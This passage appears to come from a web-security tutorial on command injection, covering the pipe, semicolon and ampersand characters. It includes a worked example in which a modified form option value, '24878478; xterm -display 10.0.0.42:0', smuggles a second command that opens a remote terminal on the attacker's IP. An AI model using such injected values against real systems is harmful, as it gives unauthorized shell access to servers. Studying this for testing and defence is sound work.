    # Pipe, Semicolon; Ampersand Characters


    The pipe character (%7c) can be used to chain UNIX commands.


    The semicolon (%3b) is the easiest character to use for command execution. The
    semicolon is used to separate multiple commands on a single command line. Thus,
    this character sometimes tricks UNIX-based scripts. The test is executed by appending
    the semicolon, followed by the command to run, to the field.


    The next example demonstrates how modifying an input value in a drop-down menu
    leads to command execution. Normally, the application receives an eight-digit
    number when the user selects one of the menus. The vulnerable file is called.html.
    This file is not vulnerable, but its HTML form calls a name view.sh. The "-suffix
    sets off the input validation alerts, especially command execution. In the HTML
    source code displayed in the user''s browser, one of the options appears:


    ```

    <option value = "24878478" > Jones Services Co.

    ```


    The method is POST. We could go through the trouble of setting up a proxy tool
    like Achilles and modify the data before the POST request. However, we save the
    file to our local computer and modify it to execute an arbitrary command (the
    attacker''s IP address is 10.0.0.42). Our choice of command is to display a terminal
    window from the Web server onto our client. Of course, both the client and server
    must support the X Window System. We craft the command and set the new value in
    the file we have downloaded on our local computer.


    ```

    <option value = "24878478; xterm -display 10.0.0.42:0" >

    Jones Energy Services Co.

    ```


    Now, we open the code of arcfiles.html that''s on our local computer. Next, select
    "Jones Energy Services Co," from the drop-down menu. The UNIX-based application
    receives the eight-digit input value and passes it to view.sh, but the argument
    also contains a semicolon. The CGI script, written in a Bash shell, parses the
    eight-digit option as normal and moves to the next command in the string. If everything
    goes as planned, an xterm pops up on the console and we have instant command-line
    access to the victim.


    This example also drives the importance of surveying the application. This input
    validation attack would have been a waste of time if it were tried against a Web
    server running on Windows 2000. Know your target!


    The ampersand (%26) can also be used to execute commands. Normally, this character
    is used as a delimiter for arguments on the URL. However, with simple URL encoding,
    they can be submitted as part of the value. Big Brother, a shell-based application
    for monitoring systems, had several vulnerabilities. Bugtraq ID 1779 describes
    arbitrary command execution with the ampersand character.'
